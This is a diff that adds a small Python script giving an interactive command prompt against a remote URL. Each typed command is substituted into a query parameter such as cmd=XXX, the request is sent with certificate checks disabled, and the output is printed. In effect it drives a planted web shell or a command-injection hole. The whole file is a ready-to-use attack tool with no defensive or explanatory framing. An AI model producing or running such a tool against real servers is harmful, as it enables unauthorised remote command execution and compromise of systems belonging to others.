@@ -1,0 +1,55 @@
+#!/usr/bin/env -S uv run --script
+# /// script
+# requires-python = ">=3.10"
+# dependencies = [
+#     "httpx",
+#     "prompt_toolkit"
+# ]
+# ///
+# chmod +x ./ia.py
+# ./ia.py http://someurl.domain/somepage?cmd=XXX
+
+
+import sys
+
+import httpx
+
+from prompt_toolkit import PromptSession
+from prompt_toolkit.history import FileHistory
+
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"{sys.argv[0]} http://someurl.domain/somepage?cmd=XXX\n XXX is the param to be replaced with a command to be executed")
+        sys.exit(1)
+
+    url = sys.argv[1]
+
+    our_history = FileHistory(".ia-history")
+
+    session = PromptSession(history=our_history)
+
+    while True:
+        try:
+            text = session.prompt("# ").strip()
+
+            if not text:
+                continue
+
+            if text == "exit":
+                break
+
+            r = httpx.get(url.replace('XXX', text), verify=False)
+
+            if r.status_code == httpx.codes.OK:
+                print(r.content.decode('utf8'))
+            else:
+                print(f"[-] ERROR: {r.content}")
+        except EOFError:
+            print("")
+            continue
+        except KeyboardInterrupt:
+            sys.exit(0)
+
+if __name__ == "__main__":
+    main()
